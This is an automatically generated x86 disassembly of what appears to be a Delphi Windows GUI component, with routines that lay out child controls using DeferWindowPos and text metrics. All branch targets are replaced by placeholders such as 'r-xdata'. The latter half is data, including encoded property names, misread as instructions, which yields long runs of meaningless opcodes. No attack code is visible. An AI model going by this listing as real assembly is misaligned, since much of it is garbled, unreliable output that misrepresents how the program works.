je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42edbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4428f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42eedd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4428f4
call sub_40395c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43cc64
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43cc40
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42eef8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4447a8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42ef24
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_444db4
pop esi
pop ebx
retn
sub_42f0c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_436d60
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413fac
xor edx edx
mov eax edi
call sub_43d3a4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43d5f8
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42f4f8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f14c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_4142a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43fab0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42f184
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42f1e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_437060
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42f1ee
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f214
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_442c44
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403320
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42f254
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_442a8c
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403320
pop edx
pop esi
pop ebx
retn
sub_42f280
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_435c58
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42f530
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42f310
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42f5a4
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403124
mov eax [ esi + 0x210 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4458d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42f360
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41de94
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42f4e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_443c60
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43d3a4
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_43ce88
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_414108
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403320
test al al
je r-xdata
sub_42f4f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_414164
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43d090
mov eax ebx
mov si 0xffeb
call sub_403320
sub_42f530
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_42f6a8
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_42f5a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f0c8
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_4141f0
call sub_403124
pop edi
pop esi
pop ebx
retn
sub_42f5e4
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_42f360
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f61c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_414108
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_414108
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_42f6a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f771
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_42f5a4
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_42f360
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f778
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_414108
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_414108
pop edx
call sub_43d4b4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_42f780
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44314c
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_414108
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_42fa4d
clc
inc edx
add al bh
mov [ edi ] al
test al bh
inc edx
add al dh
mov [ edi ] al
jl r-xdata
inc edx
add al ch
mov [ edi ] al
je r-xdata
inc edx
add al ah
mov [ edi ] al
insb
clc
inc edx
add al bl
mov [ edi ] al
clc
inc edx
add al dl
mov [ edi ] al
pop esp
clc
inc edx
add al cl
mov [ edi ] al
push esp
clc
inc edx
add al al
mov [ edi ] al
dec esp
clc
inc edx
add [ eax + 0x44004788 ] bh
clc
inc edx
add [ eax + 0x3c004788 ] dh
clc
inc edx
add [ eax + 0x34004788 ] ch
clc
inc edx
add [ eax + 0x2c004788 ] ah
clc
inc edx
add [ eax + 0x24004788 ] bl
clc
inc edx
add [ eax + 0x1c004788 ] dl
clc
inc edx
add [ eax + 0x14004788 ] cl
clc
inc edx
add [ eax + 0xc004788 ] al
clc
inc edx
add [ eax - 0x78 ] bh
inc edi
add [ eax + edi * 8 ] al
inc edx
add [ eax - 0x78 ] dh
inc edi
add ah bh
test [ edx ] rw-data
hlt
sub_42fb60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fb85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb8c
retn
sub_42fb98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42fbc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fbd0
retn
mov eax [ rw-data ]
call sub_403124
sub_42fc64
push 0x30042fc
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
mov bl 0x41
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
dec eax
test [ ebx ] al
insb
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc edx
add [ eax + eax ] ah
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + edi * 8 + 0x42 ] ah
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ ebp + edi * 8 + 0x240042 ] ah
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
xor [ eax ] al
fdiv [ edx + 0x146c0041 ]
inc ebx
add al bl
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
add [ ebx + esi * 4 ] cl
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al bl
mov dl 0x41
add [ esp + edx + 0x43 ] ch
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
inc ecx
add al ch
retn
je r-xdata
outsb
jae r-xdata
adc [ eax + 0x58 ] ch
cld
inc edx
add bl al
jmp sub_403878
rol ah 0xfc
inc edx
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edi
insb
jns r-xdata
add [ eax - 0x4d ] bh
inc ecx
add ah dl
retn 0x43
inc ecx
add [ ebx + esi * 4 ] ah
inc ecx
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
sub ch bh
inc edx
sub_42feb8
jmp r-xdata
inc [ edi + ebx ]
inc ebx
add [ edi + ebx ] ah
inc ebx
add [ eax + 0x1f ] bl
inc ebx
add al cl
pop ds
inc ebx
add [ eax + 0x20 ] ah
inc ebx
add [ eax + 0x20 ] ch
inc ebx
add [ eax + 0x20 ] dh
inc ebx
add [ eax + 0x21080043 ] dl
inc ebx
add [ eax ] al
and al [ ebx ]
sbb [ 0x1d040043 ] bl
inc ebx
add [ ebx + ebx ] cl
inc ebx
add [ ebx + ebx + 0x43 ] ah
add [ esp + ebx ] al
inc ebx
add ah bh
sbb al 0x43
add [ esp + edx * 2 ] cl
push ebx
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
inc edx
jne r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
popad
add [ eax ] al
je r-xdata
add bh bh
dec esp
stc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
outsd
xchg [ ebx ] al
outsb
nop
or al 0xff
inc edx
add [ edi ] al
or al 0x54
push ebx
jo r-xdata
add [ fs : eax ] al
jb r-xdata
add [ ecx ] ah
add bh bh
fadd st7
inc ebx
add [ eax + ecx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
inc edx
jne r-xdata
add [ edi ] al
imul ebp [ esi + 0x74 ] 0x40105473
add [ eax + 0x1 ] ch
add bh bh
dec eax
push ds
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
add [ eax ] eax
inc eax
adc al 0x41
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ 0x6e410700 ] cl
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
sub al 0x1e
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
dec ecx
outsb
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
xchg [ ebx ] eax
je r-xdata
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
add [ eax ] al
or eax 0x6e410700
add eax [ eax ]
outsb
or dh bh
inc edx
add ah bh
cdq
inc ebx
add [ edi ] ah
add [ edi ] al
inc edx
jne r-xdata
aad 0x43
push sub_42fc64
jae r-xdata
popad
jo r-xdata
add [ eax ] al
lds eax [ ecx ]
push 0x78ff0000
aad 0x43
adc [ eax ] al
jo r-xdata
add bh bh
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
[ esi + ebx + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add bh bh
pop esp
push ds
inc ebx
inc ebx
iretd
add bh bh
mov esp 0x100431d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
add al 0x44
outsd
ja r-xdata
add [ edi ] bl
outsb
jae r-xdata
add [ eax ] al
jmp [ ebx + edx * 8 - 0xb0bffbd ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
add [ edx - 0x7010000 ] bl
aad 0x43
jne r-xdata
add [ eax + 0x43d5 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
add [ eax + 0x43070012 ] al
cmp [ esi - 0x2b7bffbd ] al
inc ebx
add [ esp + edx * 8 - 0xb8bffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
add [ eax + 0x2c ] ah
inc ecx
add [ eax + eax ] bh
add dh bh
clc
mov [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
add [ eax ] eax
push [ esi + ebx + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
add al 0x0
add [ eax ] al
pop ds
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0xf8ff0000 0x43d5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
outsb
je r-xdata
inc ebx
push esp
adc [ eax ] al
jl r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call esp
aad 0x43
add [ ebp + edx * 8 + 0x43 ] bl
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
dec ebp
outsd
jne r-xdata
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
mov ah 0x1e
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa465646f
leave
inc esp
add [ eax + eax ] bh
hlt
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
add bh bh
js r-xdata
inc ebx
add [ eax - 0x34000000 ] cl
popfd
inc ebx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
outsb
je r-xdata
outsb
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
add [ edi ] al
push ebx
jo r-xdata
[ eax + 0x100431e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
add bh bh
cwde
push ds
inc ebx
add [ ecx ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax + 0x1d ] dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ esi + 0x75 ] ecx
insd
inc edi
insb
jns r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc eax
add al dh
add eax 0x540b0043
inc edi
insb
jns r-xdata
push 0x7473694c
nop
lodsb [ esi ]
add eax [ ebx ]
pop es
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
insb
mov [ ebx ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
adc [ eax ] al
push edi
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
push 0x40100073
add [ ecx ] bl
add bh bh
mov al 0xd5
inc ebx
das
std
dec [ ebx - 0x740f7426 ]
inc ebp
or [ eax + 0x33 ] dl
ror [ ebx - 0x6055173a ] cl
add [ eax ] eax
push 0x68636143
jo r-xdata
push 0x7473694c
pop eax
add eax [ ebx ]
push 0xc00439e
add [ edi ] al
inc edx
jne r-xdata
aam 0x4
inc ebx
dec ebp
outsd
jbe r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
je r-xdata
add ah cl
mov dl 0x44
add [ esi + esi * 4 + 0x44 ] dl
add [ edx + esi * 4 ] cl
inc esp
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] al
movsb [ edi ] [ esi ]
inc esp
add [ eax ] al
scasb [ edi ]
inc esp
add [ eax + 0x55 ] ah
inc esp
add [ eax ] cl
mov ebx 0xbb940044
inc esp
add [ esi + edx * 2 + 0x540a0044 ] ah
inc edi
insb
jns r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add ah dl
add al 0x43
hlt
xor eax [ eax ]
js r-xdata
add [ eax ] al
